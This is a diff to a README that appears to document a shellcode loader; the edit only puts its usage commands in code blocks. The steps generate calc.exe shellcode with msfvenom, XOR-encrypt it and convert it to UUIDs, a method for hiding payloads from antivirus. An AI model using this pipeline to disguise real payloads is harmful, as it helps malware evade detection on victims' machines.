@@ -32,13 +32,16 @@
 
 ## Usage (incase you would want to change calc.exe, more on that later)
  - generate shellcode for calc
-msfvenom -p windows/x64/exec CMD="calc.exe" -f raw -o edge.bin
+
+```msfvenom -p windows/x64/exec CMD="calc.exe" -f raw -o edge.bin```
 
  - XOR encrypt
-python3 xor_encrypt.py edge.bin
+
+```python3 xor_encrypt.py edge.bin```
 
  - convert to UUIDs
-python3 bin_to_uuid.py edge.bin.xor
+
+```python3 bin_to_uuid.py edge.bin.xor```
 
 - prints new UuidArray + NumberOfElements (Check the image below) :
 
